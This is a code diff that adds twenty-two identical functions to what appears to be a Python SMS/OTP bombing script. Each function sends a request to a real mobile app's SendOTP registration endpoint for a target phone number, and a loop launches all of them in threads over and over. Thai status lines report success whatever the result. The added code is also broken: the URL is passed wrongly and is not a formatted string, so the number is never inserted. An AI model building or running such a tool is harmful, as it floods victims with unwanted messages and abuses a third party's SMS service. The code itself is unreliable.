@@ -612,6 +612,270 @@ def API_28():  # PT-MAXCARD
             print("\033[99m โดนไอเวฟงัดหัว : ꜱᴜᴄᴄᴇꜱ ✔")
     except:
         pass
+def API_29(): 
+    try:
+        jun = ('phone')
+        req = requests.get(
+            f,"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register"
+        )
+        if str(jun) in str(req.text):
+            print("\033[94m โดนไอเวฟงัดหัว : ꜱᴜᴄᴄᴇꜱ ✔")
+        else:
+            print("\033[94m โดนไอเวฟงัดหัว : ꜱᴜᴄᴄᴇꜱ ✔")
+    except:
+        pass
+def API_30(): 
+    try:
+        jun = ('phone')
+        req = requests.get(
+            f,"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register"
+        )
+        if str(jun) in str(req.text):
+            print("\033[94m โดนไอเวฟงัดหัว : ꜱᴜᴄᴄᴇꜱ ✔")
+        else:
+            print("\033[94m โดนไอเวฟงัดหัว : ꜱᴜᴄᴄᴇꜱ ✔")
+    except:
+        pass    
+def API_31(): 
+    try:
+        jun = ('phone')
+        req = requests.get(
+            f,"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register"
+        )
+        if str(jun) in str(req.text):
+            print("\033[94m โดนไอเวฟงัดหัว : ꜱᴜᴄᴄᴇꜱ ✔")
+        else:
+            print("\033[94m โดนไอเวฟงัดหัว : ꜱᴜᴄᴄᴇꜱ ✔")
+    except:
+        pass    
+def API_32(): 
+    try:
+        jun = ('phone')
+        req = requests.get(
+            f,"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register"
+        )
+        if str(jun) in str(req.text):
+            print("\033[94m โดนไอเวฟงัดหัว : ꜱᴜᴄᴄᴇꜱ ✔")
+        else:
+            print("\033[94m โดนไอเวฟงัดหัว : ꜱᴜᴄᴄᴇꜱ ✔")
+    except:
+        pass        
+def API_33(): 
+    try:
+        jun = ('phone')
+        req = requests.get(
+            f,"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register"
+        )
+        if str(jun) in str(req.text):
+            print("\033[94m โดนไอเวฟงัดหัว : ꜱᴜᴄᴄᴇꜱ ✔")
+        else:
+            print("\033[94m โดนไอเวฟงัดหัว : ꜱᴜᴄᴄᴇꜱ ✔")
+    except:
+        pass    
+def API_34(): 
+    try:
+        jun = ('phone')
+        req = requests.get(
+            f,"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register"
+        )
+        if str(jun) in str(req.text):
+            print("\033[94m โดนไอเวฟงัดหัว : ꜱᴜᴄᴄᴇꜱ ✔")
+        else:
+            print("\033[94m โดนไอเวฟงัดหัว : ꜱᴜᴄᴄᴇꜱ ✔")
+    except:
+        pass    
+def API_35(): 
+    try:
+        jun = ('phone')
+        req = requests.get(
+            f,"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register"
+        )
+        if str(jun) in str(req.text):
+            print("\033[94m โดนไอเวฟงัดหัว : ꜱᴜᴄᴄᴇꜱ ✔")
+        else:
+            print("\033[94m โดนไอเวฟงัดหัว : ꜱᴜᴄᴄᴇꜱ ✔")
+    except:
+        pass    
+def API_36(): 
+    try:
+        jun = ('phone')
+        req = requests.get(
+            f,"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register"
+        )
+        if str(jun) in str(req.text):
+            print("\033[94m โดนไอเวฟงัดหัว : ꜱᴜᴄᴄᴇꜱ ✔")
+        else:
+            print("\033[94m โดนไอเวฟงัดหัว : ꜱᴜᴄᴄᴇꜱ ✔")
+    except:
+        pass    
+def API_37(): 
+    try:
+        jun = ('phone')
+        req = requests.get(
+            f,"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register"
+        )
+        if str(jun) in str(req.text):
+            print("\033[94m โดนไอเวฟงัดหัว : ꜱᴜᴄᴄᴇꜱ ✔")
+        else:
+            print("\033[94m โดนไอเวฟงัดหัว : ꜱᴜᴄᴄᴇꜱ ✔")
+    except:
+        pass    
+def API_38(): 
+    try:
+        jun = ('phone')
+        req = requests.get(
+            f,"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register"
+        )
+        if str(jun) in str(req.text):
+            print("\033[94m โดนไอเวฟงัดหัว : ꜱᴜᴄᴄᴇꜱ ✔")
+        else:
+            print("\033[94m โดนไอเวฟงัดหัว : ꜱᴜᴄᴄᴇꜱ ✔")
+    except:
+        pass    
+def API_39(): 
+    try:
+        jun = ('phone')
+        req = requests.get(
+            f,"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register"
+        )
+        if str(jun) in str(req.text):
+            print("\033[94m โดนไอเวฟงัดหัว : ꜱᴜᴄᴄᴇꜱ ✔")
+        else:
+            print("\033[94m โดนไอเวฟงัดหัว : ꜱᴜᴄᴄᴇꜱ ✔")
+    except:
+        pass    
+def API_40(): 
+    try:
+        jun = ('phone')
+        req = requests.get(
+            f,"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register"
+        )
+        if str(jun) in str(req.text):
+            print("\033[94m โดนไอเวฟงัดหัว : ꜱᴜᴄᴄᴇꜱ ✔")
+        else:
+            print("\033[94m โดนไอเวฟงัดหัว : ꜱᴜᴄᴄᴇꜱ ✔")
+    except:
+        pass    
+def API_41(): 
+    try:
+        jun = ('phone')
+        req = requests.get(
+            f,"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register"
+        )
+        if str(jun) in str(req.text):
+            print("\033[94m โดนไอเวฟงัดหัว : ꜱᴜᴄᴄᴇꜱ ✔")
+        else:
+            print("\033[94m โดนไอเวฟงัดหัว : ꜱᴜᴄᴄᴇꜱ ✔")
+    except:
+        pass       
+def API_42(): 
+    try:
+        jun = ('phone')
+        req = requests.get(
+            f,"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register"
+        )
+        if str(jun) in str(req.text):
+            print("\033[94m โดนไอเวฟงัดหัว : ꜱᴜᴄᴄᴇꜱ ✔")
+        else:
+            print("\033[94m โดนไอเวฟงัดหัว : ꜱᴜᴄᴄᴇꜱ ✔")
+    except:
+        pass    
+def API_43(): 
+    try:
+        jun = ('phone')
+        req = requests.get(
+            f,"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register"
+        )
+        if str(jun) in str(req.text):
+            print("\033[94m โดนไอเวฟงัดหัว : ꜱᴜᴄᴄᴇꜱ ✔")
+        else:
+            print("\033[94m โดนไอเวฟงัดหัว : ꜱᴜᴄᴄᴇꜱ ✔")
+    except:
+        pass        
+def API_44(): 
+    try:
+        jun = ('phone')
+        req = requests.get(
+            f,"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register"
+        )
+        if str(jun) in str(req.text):
+            print("\033[94m โดนไอเวฟงัดหัว : ꜱᴜᴄᴄᴇꜱ ✔")
+        else:
+            print("\033[94m โดนไอเวฟงัดหัว : ꜱᴜᴄᴄᴇꜱ ✔")
+    except:
+        pass    
+def API_45(): 
+    try:
+        jun = ('phone')
+        req = requests.get(
+            f,"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register"
+        )
+        if str(jun) in str(req.text):
+            print("\033[94m โดนไอเวฟงัดหัว : ꜱᴜᴄᴄᴇꜱ ✔")
+        else:
+            print("\033[94m โดนไอเวฟงัดหัว : ꜱᴜᴄᴄᴇꜱ ✔")
+    except:
+        pass    
+def API_46(): 
+    try:
+        jun = ('phone')
+        req = requests.get(
+            f,"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register"
+        )
+        if str(jun) in str(req.text):
+            print("\033[94m โดนไอเวฟงัดหัว : ꜱᴜᴄᴄᴇꜱ ✔")
+        else:
+            print("\033[94m โดนไอเวฟงัดหัว : ꜱᴜᴄᴄᴇꜱ ✔")
+    except:
+        pass    
+def API_47(): 
+    try:
+        jun = ('phone')
+        req = requests.get(
+            f,"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register"
+        )
+        if str(jun) in str(req.text):
+            print("\033[94m โดนไอเวฟงัดหัว : ꜱᴜᴄᴄᴇꜱ ✔")
+        else:
+            print("\033[94m โดนไอเวฟงัดหัว : ꜱᴜᴄᴄᴇꜱ ✔")
+    except:
+        pass    
+def API_48(): 
+    try:
+        jun = ('phone')
+        req = requests.get(
+            f,"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register"
+        )
+        if str(jun) in str(req.text):
+            print("\033[94m โดนไอเวฟงัดหัว : ꜱᴜᴄᴄᴇꜱ ✔")
+        else:
+            print("\033[94m โดนไอเวฟงัดหัว : ꜱᴜᴄᴄᴇꜱ ✔")
+    except:
+        pass    
+def API_49(): 
+    try:
+        jun = ('phone')
+        req = requests.get(
+            f,"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register"
+        )
+        if str(jun) in str(req.text):
+            print("\033[94m โดนไอเวฟงัดหัว : ꜱᴜᴄᴄᴇꜱ ✔")
+        else:
+            print("\033[94m โดนไอเวฟงัดหัว : ꜱᴜᴄᴄᴇꜱ ✔")
+    except:
+        pass    
+def API_50(): 
+    try:
+        jun = ('phone')
+        req = requests.get(
+            f,"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register"
+        )
+        if str(jun) in str(req.text):
+            print("\033[94m โดนไอเวฟงัดหัว : ꜱᴜᴄᴄᴇꜱ ✔")
+        else:
+            print("\033[94m โดนไอเวฟงัดหัว : ꜱᴜᴄᴄᴇꜱ ✔")
+    except:
+        pass    
 
 
 for i in range(num):
@@ -644,3 +908,25 @@ for i in range(num):
     threading.Thread(target=API_26).start()
     threading.Thread(target=API_27).start()
     threading.Thread(target=API_28).start()
+    threading.Thread(target=API_29).start()
+    threading.Thread(target=API_30).start()
+    threading.Thread(target=API_31).start()
+    threading.Thread(target=API_32).start()
+    threading.Thread(target=API_33).start()
+    threading.Thread(target=API_34).start()
+    threading.Thread(target=API_35).start()
+    threading.Thread(target=API_36).start()
+    threading.Thread(target=API_37).start()
+    threading.Thread(target=API_38).start()
+    threading.Thread(target=API_39).start()
+    threading.Thread(target=API_40).start()
+    threading.Thread(target=API_41).start()
+    threading.Thread(target=API_42).start()
+    threading.Thread(target=API_43).start()
+    threading.Thread(target=API_44).start()
+    threading.Thread(target=API_45).start()
+    threading.Thread(target=API_46).start()
+    threading.Thread(target=API_47).start()
+    threading.Thread(target=API_48).start()
+    threading.Thread(target=API_49).start()
+    threading.Thread(target=API_50).start()
